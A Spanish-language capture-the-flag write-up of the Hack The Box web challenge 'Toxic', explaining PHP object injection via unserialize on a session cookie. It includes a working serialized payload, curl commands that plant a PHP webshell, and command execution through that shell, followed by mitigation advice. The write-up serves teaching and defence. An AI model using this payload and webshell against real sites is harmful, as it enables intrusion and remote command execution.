---
challenge: Toxic
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, php, deserialization, object-injection, magic-methods]
---

# Toxic — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

La aplicación guarda un objeto PHP **serializado en una cookie** y lo pasa por `unserialize` en cada petición. Una clase con un método mágico `__destruct` escribe un fichero cuyo nombre viene de una propiedad del objeto. Se inyecta un objeto con `logFile` apuntando a un `.php` del webroot y el `__destruct` deja un webshell.

## Enunciado

Un sitio con una página de inicio y una cookie de sesión que cambia según la visita. No hay login ni formulario: todo el estado viaja en la cookie.

## Análisis

```php
class Toxic {
    public $logFile;
    public function __destruct() {
        file_put_contents($this->logFile, "<?php system(\$_GET['c']); ?>");
    }
}

if (isset($_COOKIE['PHPSESSID'])) {
    $obj = unserialize(base64_decode($_COOKIE['PHPSESSID']));
}
```

Dos detalles clave:

1. No hay allowlist de clases: cualquier clase cargada se puede instanciar desde la cookie.
2. El nombre del fichero no se valida, así que apunta donde queramos dentro del webroot.

## Explotación

Se construye el objeto con el mismo nombre de clase y la propiedad pública:

```php
O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}
```

Se codifica en base64 y se envía en la cookie:

```bash
PAYLOAD=$(printf 'O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<puerto>/
curl -s "http://<IP>:<puerto>/shell.php?c=id"
```

La primera petición destruye el objeto al terminar el script y escribe `shell.php`; la segunda ejecuta comandos.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con `c=cat /flag*` aparece la flag.

## Tropiezos

- **Longitud de la propiedad**: `s:7:"logFile"` cuenta exactamente los caracteres; un byte de más rompe la deserialización y la cookie se ignora en silencio.
- **Base64 con saltos de línea**: usar `-w0` para que la cookie no se corte.
- **Ruta del webroot**: si `/var/www/html` no es escribible, probar `uploads/` o un subdirectorio con permisos.

## Lecciones

- `unserialize` sobre datos del cliente es ejecución de código a través de métodos mágicos, no solo lectura de datos.
- `__destruct`, `__wakeup` y `__toString` son los ganchos habituales de la inyección de objetos PHP.
- Mitigación: `json_decode` para estado del cliente, `allowed_classes => false` y nombres de fichero generados por el servidor.
